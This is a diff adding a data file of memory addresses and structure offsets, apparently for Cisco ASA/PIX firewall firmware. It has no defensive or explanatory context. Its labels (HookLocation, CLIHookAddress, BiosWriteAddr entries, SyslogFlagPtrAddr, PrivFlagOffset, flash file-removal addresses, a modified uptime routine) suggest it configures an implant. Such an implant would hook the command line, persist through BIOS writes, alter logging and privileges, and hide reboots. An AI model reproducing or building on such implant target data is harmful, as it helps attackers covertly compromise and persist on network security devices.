@@ -1,0 +1,145 @@
+; --- SECTION I ---
+;
+0x10070500            
+0x534000              
+0x0   0x009597c0      
+0x1   0x00959bac      
+0x2   0x00113f34      
+0x3   0x004dd3b8      
+0x4   0x00114038      
+0x5   0x00c597f0      
+0x6   0x00c47b30      
+0x7   0x00c62b64      
+0x8   0x0095946c      
+0x9   0x00c509bc      
+0xa   0x00c48ecc      
+0xb   0x00000014      
+0xc   0x00000010      
+0xd   0x0000005c      
+0xe   0x00000078      
+0xf   0x00c62984      
+0x15  0x001116cc      
+0x16  0x001124c4      
+0x17  0x00112f60      
+0x18  0x007726e0      
+0x19  0x0000001c      
+0x1a  0x00e7a370      
+0x1b  0x04      
+0x1c  0x0c      
+0x1d  0x24      
+0x1e  0x00      
+0x1f  0x10      
+0x20  0x004e09c4      
+0x21  0x004e223c      
+0x22  0x004e0f6c      
+0x23  0x004f2b90      
+0x24  0x00b096e4      
+0x25  0x00b0dc50      
+0x26  0x004df30c      
+0x27  0x004e403c      
+0x28  0x007bd8e4      
+0x2a  0x3c      
+0x2b  0x34            
+0x2c  0x1c            
+0x2d  0x0065c9f4      
+0x2e  0x18c      
+0x2f  0x00e1ef10      
+0x30  0x00d471dc      
+0x31  0x00000014      
+0x32  0x00000020      
+0x33  0x00000018      
+0x34  0x00e06d5c      
+0x35  0x00e79b50      
+0x36  0x007bc760      
+0x37  0x00000143      
+0x38  0x4c      
+0x39  0x68      
+0x3a  0x41c      
+0x3b  0x00441410      
+0x3c  0x004414c8      
+0x3d  0x00440e50      
+0x3e  0x00441310      
+0x3f  0x18        
+0x40  0x00e93a40      
+0x41  0x004fcdc0      
+0x42  0x00c569aa      
+0x43  0x004d4b68      
+0x44  0x004526e0      
+0x45  0x00538800      
+0x46  0x0073b4ac      
+0x47  0x18      
+;
+; --- END OF SECTION I ---
+;
+:EOS:
+;
+; --- SECTION II ---
+;
+HookLocation        0x0065bb7e      
+JmpLocation         0x0065cde2      
+InterfaceAddr       0x00d471dc      
+InterfaceLeng       0x000001b8      
+IntSecurityOffset   0x1c      
+IntNameOffset       0x188      
+IntNumOffset        0x143      
+IntVlanOffset       0x10      
+IntIPOffset         0x20      
+IntNetmaskOffset    0x24      
+FlashClassAddr      0x00000000      
+CryptoDeviceAddr    0x00e7ee58      
+ArpTableAddrPtr     0x00d399ac      
+ArpTableLastPtr     0x00d399b4      
+NumInterfaces       0x00000000      
+IfaceStruct2        0x00000000      
+IfaceStruct2Len     0x00      
+BiosClassAddr       0x00e8bec0      
+BiosWriteAddr1      0x003affac      
+BiosWriteAddr2      0x003b26e4      
+BiosWriteAddr3      0x003b2df8      
+BiosWriteAddr4      0x003b3614      
+BiosWriteAddr5      0x00000000      
+BiosWriteOffset     0x00000020      
+FlashMkdirAddress   0x00441b30      
+ASAFlashRmdirAddress   0x0073c6d4   
+PIXFlashRmdirAddress   0x003ab7a0      
+ASAFlashRmfileAddress  0x0073c67c      
+PIXFlashRmfileAddress  0x003ab630      
+FlashDirlistAddress 0x00441658      
+FlashGetSizeAddress 0x00440b3c      
+FlashChmodAddress   0x00441790      
+FlashMoveFileAddress 0x004418b4     
+FlashGetFileInfoAddress 0x00441d60  
+FlashGetSpaceAddress 0x00443084     
+FlashFileInfoSizeOffset 0x00000018  
+GetPlatformStringAddr 0x00c4c1b4  
+ASARestatFlashFlagAddr 0x00e9fdf8 
+AnnounceFunc        0x00113e84      
+DevIoctlOffset      0x00000070      
+CIStartFunc         0x00145950      
+CommandListAddr     0x00d64ad4      
+DeviceListPtrAddr   0x00dcb620      
+DeviceNextPtrOffset 0x50            
+StrcmpFuncAddr      0x00c57a10      
+SyslogFlagPtrAddr   0x00f3e0f0      
+PGDGETValue         0x85b00002      
+PGDPUSHValue        0x85b00003      
+PGDSETValue         0x85b00000      
+StdChOffset         0x6c            
+StdErrOffset        0x70            
+PrivFlagOffset      0x0c            
+UnameOffset         0x14            
+EnvPtrOffset        0x78            
+SyslogOffset        0x000008f8      
+Open                0x00113f34      
+CLIHookAddress       0x00145e18      
+WatchDogTimeout     0x00c86ecc      
+UpTimeCounter       0x00e79b50      
+Get_uptime_secs_addr            0x0079ab40  
+Modified_getuptime_code_addr    0x00152fe7  
+Get_uptime_secs_call_instr_addr 0x00152441  
+AvailMemoryPtr      0x00e7a880      
+;
+; --- END OF SECTION II ---
+;
+:EOS:
+;
